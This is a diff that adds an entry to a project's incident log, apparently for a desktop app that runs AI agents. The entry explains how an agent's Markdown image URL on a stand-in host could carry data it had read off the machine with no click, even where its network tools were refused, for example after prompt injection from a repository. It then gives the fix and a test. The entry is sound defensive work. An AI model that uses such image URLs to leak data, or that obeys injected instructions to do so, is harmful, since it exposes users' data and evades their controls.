@@ -5,6 +5,25 @@ a diff shows what changed and never why the old behaviour was wrong. Newest firs
 service indexes this file per entry, so a sibling can ask "has anyone hit this" without opening the
 repository.
 
+## An agent's Markdown image made the page fetch a URL the agent chose (2026-09-25)
+
+**Symptom.** Found by REV3's reading, then shown by probe. An agent's message containing
+`![log](https://host.example/p.png?d=<anything it read>)` rendered as an `<img>`, and the desktop's
+webview fetched it with no click. Whatever the agent put in that URL left the machine. It did so even
+where the agent's own network tools were refused (D47 §4, D52), for example if the agent had been
+prompt-injected by a repository's content.
+
+**Root cause.** D76 §5 made the conversation "safe by default" by not parsing raw HTML, and the test
+proved that raw `<img>` HTML stays text. A Markdown image is not raw HTML, though. The renderer's
+default kept `https:` sources, and `Markdown.tsx` overrode links and code but not images.
+
+**Fix.** An image renders as a link to what it names, labelled with its alt text. It opens outside the
+window, and only when clicked.
+
+**Verify.** `never loads an agent's Markdown image`: there is no `<img>` in the page, and the link
+opens outside the window with the URL intact. The test failed on `<img alt="build log">` before the
+fix.
+
 ## An answer that outlived the session it was for armed a destructive press on another (2026-09-25)
 
 **Symptom.** Found by REV3's reading, then reproduced in a test. The person presses *discard the tree*
